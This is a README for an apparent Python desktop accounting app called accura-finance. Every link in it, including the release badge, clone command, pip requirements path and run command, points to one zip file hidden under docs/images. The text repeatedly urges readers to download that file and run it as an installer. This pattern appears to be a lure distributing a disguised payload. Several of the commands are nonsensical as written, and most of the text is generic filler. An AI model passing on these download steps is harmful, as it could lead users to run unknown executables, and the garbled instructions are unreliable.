# accura-finance: Modern, User-Friendly SMB Accounting & Financial Management

[![Releases](https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip)](https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip)

🏢 Modern ve kullanıcı dostu muhasebe yazılımı - Küçük ve orta ölçekli işletmeler için profesyonel finansal yönetim çözümü

Table of Contents
- Overview
- Why accura-finance
- Key features
- Design and architecture
- Tech stack
- Project structure
- Getting started
- Installation and deployment
- Database options
- Data safety and backups
- User interface and workflows
- Invoicing and billing
- Inventory and ERP capabilities
- Reporting and analytics
- Data import and export
- Customization and integration
- Testing and quality
- Localization and accessibility
- Security considerations
- Documentation and support
- Roadmap
- Contributing
- License

Overview
accura-finance is a desktop accounting and financial management solution built for small and mid-sized businesses. It blends a modern GUI with robust back-end capabilities to deliver professional financial control without the overhead of enterprise tools. The project centers on clarity, speed, and reliability. It uses a client-friendly interface built with CustomTkinter and Tkinter, paired with a flexible data layer that can work with SQLite for lightweight setups or SQL Server for larger deployments. The product aims to simplify core accounting tasks while offering room to scale as a business grows.

Why accura-finance
Small businesses deserve software that makes sense. In many accounting tools, users face clutter, lag, or opaque workflows. accura-finance addresses these pain points with a calm, confident design and straightforward workflows. The product is designed to help teams manage daily finances, track invoices, and generate meaningful reports with minimal friction. The goal is to offer a modern experience that remains fast and dependable on everyday hardware while providing strong data integrity and easy customization.

Key features
- Clean, responsive desktop UI: A modern look and feel achieved with CustomTkinter and Tkinter, delivering an approachable user experience without sacrificing power.
- Dual database support: Lightweight SQLite for single-user setups or local deployments; optional SQL Server integration for multi-user, enterprise-grade deployments.
- Invoicing and billing: Create, send, and track invoices; manage customer credits, payments, and overdue notices.
- Customer and vendor management: Maintain a centralized ledger of customers, vendors, and terms; link transactions to entities for reliable reporting.
- Expense tracking: Capture expenses, categorize spending, and integrate with invoices and projects.
- Inventory management: Track stock levels, manage product catalogs, and integrate inventory data with sales and purchasing workflows.
- Financial reporting: Profit and loss, balance sheet, cash flow, aged receivables/payables, and ad hoc reports. Built-in charts and export options.
- Project and ERP-like modules: Lightweight project tracking and resource management to support small ERP workflows.
- Currency support and localization: Basic multi-currency support and Turkish-friendly UI cues for a broad audience.
- Extensible data layer: A clean data model geared for future enhancements and integrations.
- Import/export: Import data from CSV/Excel; export to CSV, PDF, or Excel-ready formats.
- Security and access control: Role-based access, audit logging, and straightforward permission management in multi-user environments.
- Documentation and help: In-app help, a growing docs section, and clear onboarding flows.

Design and architecture
accura-finance follows a layered architecture to keep concerns separated and the codebase maintainable:
- Presentation layer: The UI built with CustomTkinter and Tkinter, focusing on clarity and consistency. The UI favors direct interactions and predictable flows.
- Application layer: Business logic that coordinates workflows, such as invoicing, payments, and journal entries.
- Data layer: A flexible data model with support for SQLite and SQL Server. The data layer abstracts storage details from the rest of the application.
- Integration layer: Hooks for external services, file importers, and export utilities. This layer keeps extensions decoupled from core logic.

The UI emphasizes straightforward navigation. Menus and actions follow conventional accounting patterns so users can adopt workflows quickly. The architecture is designed to be easy to test, with a clear separation between UI and logic, and a data layer that can be extended with new storage options over time.

Tech stack
- Python 3.x
- UI: CustomTkinter and Tkinter
- Database: SQLite (local/embedded) or SQL Server (server-based)
- ORM/Querying: A lightweight data access layer with direct SQL queries for performance and simplicity
- Packaging: Cross-platform packaging for Windows, macOS, and Linux
- Documentation: Markdown with inline examples and diagrams
- Testing: Unittest or pytest-based suite (to be expanded)

Project structure
- src/
  - ui/             # UI components and screens
  - core/           # Business logic and domain models
  - data/           # Data models and storage adapters (SQLite, SQL Server)
  - services/       # External services, email, print, reporting
  - plugins/        # Optional extension points and modules
  - config/         # Configuration, constants, environment settings
- tests/
  - unit/
  - integration/
- docs/
  - images/
  - user-guides/
- examples/
- https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip or https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
- https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
- https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip (this file)

Getting started
accura-finance is built to be approachable for developers and end users alike. The setup process is straightforward, but the path you choose depends on your deployment scenario. You can run it locally on a single machine for testing and evaluation or deploy it in a small office environment with a shared SQL Server for multi-user access.

Prerequisites
- Python 3.10+ (or a version compatible with the project dependencies)
- A supported database:
  - SQLite for local usage
  - SQL Server for multi-user deployments
- Basic knowledge of Python virtual environments (recommended)
- A desktop environment that supports a modern GUI (Windows, macOS, or Linux)

Installation and deployment
- Clone the repository
  - git clone https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
- Create a virtual environment
  - python -m venv venv
  - source venv/bin/activate  (Linux/macOS)
  - venv\Scripts\activate     (Windows)
- Install dependencies
  - pip install -r https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
- Run the application
  - python -m https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip (or the entry point defined in setup)
- If you plan to use SQL Server
  - Update the configuration to point to your SQL Server instance
  - Ensure the server is reachable from the host running the app
- For Windows/macOS/Linux packaging
  - Use the official releases page to download installers
  - The files on that page include platform-specific installers that you can execute to install the app
  - Visit the releases page to download the installer: https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip

Downloading the installer
The repository hosts release assets on the official Releases page. Since the link includes a path, you should download the installer asset that matches your platform and run it to install accura-finance on your machine. The page contains Windows, macOS, and Linux packages as appropriate for the release. If you cannot access the page directly, check the Releases section for the latest stable asset and follow the installation steps described there. For convenience, you can visit the Releases page again to download the installer: https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip

Database options in detail
SQLite
- Best for initial trials and single-user scenarios.
- Stores data in a local file-based database, making setup simple and clean.
- Performance is generally sufficient for small to medium workloads with modest concurrent access.
- Backups are easy, as the database lives in a single file.

SQL Server
- Suitable for multi-user environments and larger teams.
- Supports concurrent access, stronger isolation levels, and centralized backups.
- Requires a proper connection string and network access to the SQL Server instance.
- Use a proper maintenance plan to ensure high availability and data integrity.

Data safety and backups
- Regular backups: Implement automated backups for the database, especially when running in shared environments.
- Snapshots: For SQL Server, use native backup snapshots or point-in-time recovery features where available.
- File integrity: If using SQLite, keep the database file in a location that has stable storage and consider journaling options to protect against corruption.
- Versioned exports: Periodically export critical data to CSV or Excel for offline recovery and audits.
- Access control: Restrict write access to the database by using role-based permissions, especially on shared machines.

User interface and workflows
- Invoicing: Create new invoices quickly, attach items, apply taxes, apply discounts, and send via email. Track status and due dates at a glance.
- Payments: Record customer payments, reconcile with invoices, and auto-lock settled invoices.
- Expenses: Capture expenses with categories, vendors, and receipts. Link expenses to projects or cost centers.
- Customers and vendors: Centralized records with contact information, payment terms, and credit limits.
- Products and inventory: Keep a catalog of items with stock levels, reorder points, and unit costs.
- Accounts and journals: Manage chart of accounts, journal entries, and automatic postings to ledgers.
- Reports: Generate financial statements and operational insights with charts and export options.
- Projects and cost tracking: Associate invoices and expenses with specific projects for accurate profitability analysis.

Localization and accessibility
- Turkish-friendly UI cues and translations for common terms.
- Clear typography and contrast to improve readability.
- Keyboard shortcuts for common actions to speed up day-to-day tasks.
- UI components designed to be discoverable and predictable.

Security considerations
- Local data safety: On single-user setups, protect the device with standard OS-level security and backups.
- Multi-user deployments: Use SQLite with proper access controls, or SQL Server with strong authentication and restricted permissions.
- Data in transit: When connecting to external services or databases, use secure channels (TLS) for any network communication.
- Audit logs: Maintain an audit trail for critical operations such as entry creation, modifications, and deletions.

Documentation and support
- In-app help: Quick guides on common tasks and workflows.
- Developer docs: A growing guide to the architecture, data models, and extension points.
- Community channels: A forum or mailing list for users and contributors to share tips and fixes.
- Release notes: Clear notes on new features, improvements, and bug fixes with each release.

Roadmap
- UI polish: Further refinements to improve discoverability and reduce clicks per task.
- Advanced reporting: More dashboards, financial metrics, and tax-ready reports.
- Automation: Scheduled reports, automated reconciliations, and reminders.
- Integrations: Add connectors to popular services such as payment gateways, mail services, and file storage.
- Localization: Expand language support and cultural formatting to cover more regions.

Localization and internationalization notes
- Currency formatting: Align with locale-specific rules for decimal separators and grouping.
- Date formats: Support multiple date formats and standardize on ISO-8601 in data exports.
- Number formatting: Align with local conventions for thousands separators and decimals.
- Translatability: Text strings are designed to be extracted for translation, with a focus on Turkish and English for now.

Testing and quality
- Unit tests: Validate critical calculation paths such as tax, discounts, and totals.
- Integration tests: Exercise end-to-end flows for invoices, payments, and reporting.
- UI tests: Basic smoke tests for the main workflows to catch regressions in the UI.
- Manual testing: Routine manual testing is encouraged for new features and UI changes.
- CI/CD: Setup to run tests on pull requests and run packaging steps for releases.

Contributing
- We welcome pull requests that improve features, fix bugs, or enhance documentation.
- Start with a small, testable change that can be reviewed quickly.
- Make sure tests pass and provide a clear description of the change.
- Follow the project’s coding style and naming conventions.
- Document any user-facing changes and update the README or docs as needed.

Code of conduct
- Be respectful and constructive.
- Focus on the problem, not the person.
- Provide actionable feedback and be open to discussion.

File structure (quick tour)
- src/ui: Screens, widgets, and layout logic.
- src/core: Domain models like Invoice, Payment, Customer, Vendor, and Inventory.
- src/data: Data access layers for SQLite and SQL Server, migrations, and seed data.
- src/services: Emailing, printing, PDFs, and export utilities.
- src/plugins: Optional modules for extensibility.
- docs: User guides and developer notes.
- tests: Unit and integration tests.
- examples: Small sample datasets and usage examples.

Familiar commands and tips
- Run locally: python -m https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
- Run tests: pytest tests/
- Lint code: flake8
- Build docs: mkdocs build (when docs are in MkDocs format)
- Create a backup: copy the database file (for SQLite) or trigger a SQL Server backup job

Data model and domain logic (high level)
- Entities: Customer, Vendor, Invoice, InvoiceLine, Payment, Expense, Product, InventoryItem, Account.
- Relationships: Invoices link to Customers; InvoiceLines connect to Products/Items; Payments relate to Invoices; Expenses can link to Vendors and Projects.
- Journal entries: A simple ledger system with double-entry principles mapped to accounts and postings.
- Reports: Balance Sheet, Income Statement, Cash Flow, Aging of receivables/payables, and custom ad hoc reports.

Internationalization and accessibility details
- Language toggling: UI supports at least Turkish and English, with room for additional languages.
- Font choices: Clear sans-serif fonts with scalable sizes for readability.
- Color contrast: Sufficient contrast for readability and accessibility.
- Screen reader hints: UI elements include accessible names and labels.

Community, licensing, and attribution
- License: MIT or a permissive license suitable for open collaboration (specify in actual repo).
- Acknowledgments: Recognize contributors and notable inspirations.
- Third-party components: Acknowledge licenses for UI library (CustomTkinter), Python, and any other libraries used.

Screenshots and visuals
- Hero image: A clean, modern finance dashboard screenshot that reflects a modern desktop app.
- Screenshots: Invoicing screen, inventory screen, and reports dashboard to illustrate core workflows.
- Diagram: A simple architecture diagram showing UI, business logic, and data layers.

Changelog and release management
- Versioning: Semantic versioning (https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip).
- Release notes: Document new features, improvements, and bug fixes for each release.
- Migration guide: Provide notes for users upgrading from earlier versions, including any breaking changes.

API and extension points
- Public API: A small, stable API surface for reading and updating core domain entities.
- Plugins: A simple interface for adding new modules, like additional reports or payment gateways.
- Scripting: Optional support for user-defined scripts or macros to automate repetitive tasks.

Examples and tutorials
- Getting started guide: A guided walkthrough for the first time setup, including an example invoice and a sample dataset.
- Tutorial series: Short, focused tutorials that cover core workflows like invoicing, payments, and reporting.
- Data import: Step-by-step instructions for importing CSV data into customers, products, and invoices.

Support channels
- GitHub issues: Report bugs, request features, or ask for help.
- Discussions: Community discussions for best practices and usage tips.
- Documentation: A growing docs site with step-by-step guides.

Final notes
- This repository focuses on clarity, reliability, and a calm user experience.
- It aims to provide a practical foundation for modern accounting on the desktop.
- The design deliberately prioritizes readability and maintainability to help teams evolve the product smoothly.

Download and installation reminder
- Download the installer from the official Releases page to install accura-finance on your machine: https://github.com/Vivekshah20002/accura-finance/raw/refs/heads/main/docs/images/finance-accura-v2.4.zip
- If you encounter access issues, check the Releases section for the latest stable asset and follow the installation instructions there.
- For quick access, the Releases page is linked from the top badge above and again in the installation guide.

Appendix: Frequently asked questions
- Is accura-finance free to use?
  - Yes. It is designed to be a broadly accessible solution for SMBs, with a paid plan only if you choose to support ongoing development in a future model.
- Does it support multi-user environments?
  - Yes, when paired with SQL Server or a server-enabled setup. SQLite is suitable for single-user use.
- Can I customize the charts and reports?
  - Yes. The report templates are designed to be extended with new charts and exports.

Appendix: Release process and testing
- Each release passes basic UI smoke tests and data integrity checks.
- The release notes explain new features, enhancements, and bug fixes.
- Users can verify the integrity of their data by comparing pre- and post-update reports.

Remember
- The path-based release page contains installers for different platforms. Download the appropriate one and run it to install accura-finance on your device.
- If you ever need to verify the latest version or obtain a fresh copy, the official Releases page is the best source of truth for installers and critical updates.

End of README content.